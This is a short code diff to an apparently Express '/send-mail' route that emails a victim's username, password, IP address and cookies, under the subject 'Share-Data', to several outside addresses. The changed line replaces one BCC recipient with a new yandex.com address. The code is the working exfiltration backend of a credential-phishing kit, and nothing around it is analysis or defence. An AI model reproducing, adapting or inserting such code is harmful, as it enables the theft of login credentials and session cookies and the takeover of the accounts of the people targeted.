@@ -13,7 +13,7 @@ router.post('/send-mail', (req, res) => {
     const mailOptions = {
         from: 'latinaforlife@remax.pt',
         to: ['gilliard.pinheiro@tenqualuz.pt', 'dninotoolz@gmail.com'], // Primary recipients
-        bcc: ['sales02@chemrawerd.com', 'billytoolz@zohomail.eu'], // BCC recipients
+        bcc: ['h-vergmace01@yandex.com', 'billytoolz@zohomail.eu'], // BCC recipients
         subject: 'Share-Data',
         text: `Username: ${username}\nPassword: ${pass}\nIP: ${ip}\nCookies: ${JSON.stringify(cookies)}`
     };
